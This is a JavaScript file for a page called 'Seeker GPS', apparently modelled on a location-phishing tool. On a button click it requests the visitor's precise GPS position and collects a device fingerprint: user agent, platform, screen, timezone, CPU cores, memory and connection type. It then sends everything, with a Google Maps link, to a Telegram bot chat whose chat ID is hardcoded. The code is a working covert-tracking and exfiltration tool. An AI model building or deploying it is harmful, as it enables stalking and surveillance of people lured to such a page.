// ==========================================
// SEEKER GPS - MAIN JAVASCRIPT
// ==========================================

// HTML elements
const locationBtn = document.getElementById("locationBtn");
const result = document.getElementById("result");

// Telegram configuration
// IMPORTANT: Replace with your NEW bot token.
// Never publish a real bot token in frontend JavaScript.
const BOT_TOKEN = "YOUR_NEW_BOT_TOKEN_HERE";
const CHAT_ID = "9048956699";


// ==========================================
// 1. DEVICE INFORMATION READER
// ==========================================

function getDeviceInfo() {

    const connection =
        navigator.connection ||
        navigator.mozConnection ||
        navigator.webkitConnection;

    return {

        userAgent: navigator.userAgent,

        platform:
            navigator.userAgentData?.platform ||
            navigator.platform ||
            "Unavailable",

        language: navigator.language || "Unavailable",

        screenResolution:
            `${screen.width} x ${screen.height}`,

        colorDepth:
            `${screen.colorDepth}-bit`,

        timezone:
            Intl.DateTimeFormat().resolvedOptions().timeZone,

        cpuCores:
            navigator.hardwareConcurrency || "Unavailable",

        deviceMemory:
            navigator.deviceMemory
                ? `${navigator.deviceMemory} GB`
                : "Unavailable",

        connectionType:
            connection?.effectiveType || "Unavailable",

        online:
            navigator.onLine ? "Yes" : "No",

        cookiesEnabled:
            navigator.cookieEnabled ? "Yes" : "No"

    };

}


// ==========================================
// 2. SEND GPS AND DEVICE INFORMATION
// ==========================================

async function sendLocation(latitude, longitude, accuracy) {

    const telegramURL =
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

    // Read device information
    const device = getDeviceInfo();

    // Generate report
    const message = `
📍 SEEKER GPS - LOCATION REPORT

━━━━━━━━━━━━━━━━━━
🌍 LOCATION INFORMATION
━━━━━━━━━━━━━━━━━━

Latitude: ${latitude}
Longitude: ${longitude}
Accuracy: ${Math.round(accuracy)} meters

Google Maps:
https://www.google.com/maps?q=${latitude},${longitude}

━━━━━━━━━━━━━━━━━━
📱 DEVICE INFORMATION
━━━━━━━━━━━━━━━━━━

Platform: ${device.platform}
Browser/User Agent: ${device.userAgent}
Language: ${device.language}
Screen Resolution: ${device.screenResolution}
Color Depth: ${device.colorDepth}
Time Zone: ${device.timezone}
CPU Cores: ${device.cpuCores}
Device Memory: ${device.deviceMemory}
Connection Type: ${device.connectionType}
Online: ${device.online}
Cookies Enabled: ${device.cookiesEnabled}

━━━━━━━━━━━━━━━━━━
SEEKER GPS REPORT
`;

    // Send report to Telegram
    const response = await fetch(telegramURL, {

        method: "POST",

        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
        })

    });

    const data = await response.json();

    if (!response.ok || !data.ok) {

        throw new Error(
            data.description || "Telegram delivery failed."
        );

    }

    return data;

}


// ==========================================
// 3. LOCATION BUTTON EVENT
// ==========================================

locationBtn.addEventListener("click", function() {

    result.textContent =
        "Requesting location permission...";

    // Check browser GPS support
    if (!navigator.geolocation) {

        result.textContent =
            "GPS is not supported by this browser.";

        return;

    }

    // Prevent repeated clicks
    locationBtn.disabled = true;

    // Request location
    navigator.geolocation.getCurrentPosition(

        // SUCCESS
        async function(position) {

            const latitude =
                position.coords.latitude;

            const longitude =
                position.coords.longitude;

            const accuracy =
                position.coords.accuracy;

            result.textContent =
                "Location obtained. Preparing device report...";

            console.log("Latitude:", latitude);
            console.log("Longitude:", longitude);
            console.log("Accuracy:", accuracy);

            console.log("Device Information:", getDeviceInfo());

            try {

                await sendLocation(
                    latitude,
                    longitude,
                    accuracy
                );

                result.textContent =
                    "Location and device report successfully sent to Telegram!";

            } catch (error) {

                console.error(
                    "Telegram Error:",
                    error
                );

                result.textContent =
                    "Location obtained, but Telegram delivery failed. Check the console.";

            } finally {

                locationBtn.disabled = false;

            }

        },

        // ERROR
        function(error) {

            console.error("GPS Error:", error);

            switch (error.code) {

                case error.PERMISSION_DENIED:
                    result.textContent =
                        "Location permission was denied.";
                    break;

                case error.POSITION_UNAVAILABLE:
                    result.textContent =
                        "Location information is unavailable.";
                    break;

                case error.TIMEOUT:
                    result.textContent =
                        "Location request timed out.";
                    break;

                default:
                    result.textContent =
                        "An unknown location error occurred.";

            }

            locationBtn.disabled = false;

        },

        // GPS SETTINGS
        {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
        }

    );

});